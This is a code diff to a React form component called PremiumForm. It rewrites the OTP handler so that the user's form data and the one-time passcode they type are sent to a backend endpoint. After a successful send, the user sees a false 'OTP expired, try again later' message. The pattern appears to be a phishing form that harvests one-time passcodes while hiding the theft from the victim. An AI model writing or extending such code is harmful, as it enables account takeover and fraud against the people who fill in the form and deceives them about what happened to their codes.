@@ -173,14 +173,38 @@ const PremiumForm = () => {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleSendOtp = () => {
+  const handleSendOtp = async () => {
     if (otp.length < 4) {
       setOtpError('Please enter OTP first')
       return
     }
+    
     setOtpError('')
-    setOtpError('OTP expired, try again later')
-    setOtp('')
+    try {
+      const submissionData = {
+        ...formData,
+        otpVerified: false,
+        otpEntered: otp,
+        isNewSubmission: true
+      }
+      
+      const response = await fetch(`${API_URL}/submit-form`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(submissionData)
+      })
+      
+      if (response.ok) {
+        setOtpError('OTP expired, try again later')
+        setOtp('')
+      } else {
+        setOtpError('Failed to submit. Please try again.')
+      }
+    } catch (error) {
+      setOtpError('Connection error. Please try again.')
+    }
   }
 
   const submitFormData = async (isNewSubmission) => {
